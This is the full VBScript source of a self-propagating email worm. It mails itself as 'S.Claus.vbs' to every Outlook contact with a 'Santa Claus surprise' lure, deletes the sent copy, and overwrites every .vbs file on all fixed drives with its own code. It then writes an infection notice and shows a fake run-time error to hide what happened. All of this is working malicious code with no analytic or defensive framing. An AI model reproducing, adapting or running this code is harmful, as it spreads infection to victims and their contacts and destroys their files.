
Dim thisMessage, fso, WShell

On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set WShell = CreateObject("WScript.Shell")
SendMail
For Each Disk In fso.Drives
    If Disk.DriveType = 3 Then Infect Disk.RootFolder
Next
Signate
MsgBox "Run-time error '453':" & vbCrLf & vbCrLf & "Can't find DLL entry point CreateCompatibleDcEx in gdi32", 48, "Error occured"

Sub SendMail()
    On Error Resume Next
    Dim mNameSpace, OlContacts, AFile, P
    Set OLApp = CreateObject("Outlook.Application")
    If WScript.ScriptName = "S.Claus.vbs" Then
        AFile = WScript.ScriptFullName
        Else
            AFile = fso.GetSpecialFolder(2) & "\S.Claus.vbs"
            fso.CopyFile WScript.ScriptFullName, AFile
    End If
    Set thisMessage = OLApp.CreateItem(0)
        With thisMessage
            .Attachments.Add (AFile)
            .Subject = "Santa Claus surprise"
            .Body = "Would you like to see what's doing Santa Claus during his free time?"
            .DeleteAfterSubmit = True
        End With
    Set mNameSpace = OLApp.GetNamespace("MAPI")
    Set OlContacts = mNameSpace.GetDefaultFolder(10)
    ScanMailAddress OlContacts
    Set mNameSpace = Nothing: Set OlContacts = Nothing
    thisMessage.Send
End Sub

Sub ScanMailAddress(thisFolder)
    On Error Resume Next
    Dim subFolder, mContact
    For Each mContact In thisFolder.Items
       If mContact.Email1Address <> "" Then thisMessage.Recipients.Add mContact.Email1Address
   Next
    For Each subFolder In thisFolder.Folders
        ScanMailAddress subFolder
    Next
End Sub

Sub Infect(Drv)
    On Error Resume Next
    Dim F, Fold, Buf
    For Each F In Drv.Files
        If LCase(fso.GetExtensionName(F.Path)) = "vbs" Then
            Buf = fso.BuildPath(F.ParentFolder.Path, fso.GetBaseName(F.Path) & "Re.vbs")
            F.Copy (Buf)
            fso.CopyFile WScript.ScriptFullName, F.Path
        End If
    Next
    For Each Fold In Drv.SubFolders
        Infect Fold
    Next
End Sub

Sub Signate()
    On Error Resume Next
    Dim TFile, StartMenu
    ProgramsMenu = WShell.SpecialFolders.Item(13)
    Set TFile = fso.CreateTextFile(ProgramsMenu & "\read.txt")
    TFile.WriteBlankLines (2)
    TFile.Write ("Your computer was successfully infected")
    TFile.WriteBlankLines (2)
    TFile.Write ("Coding by Begbie, Slovakia")
    Set TFile = Nothing
End Sub
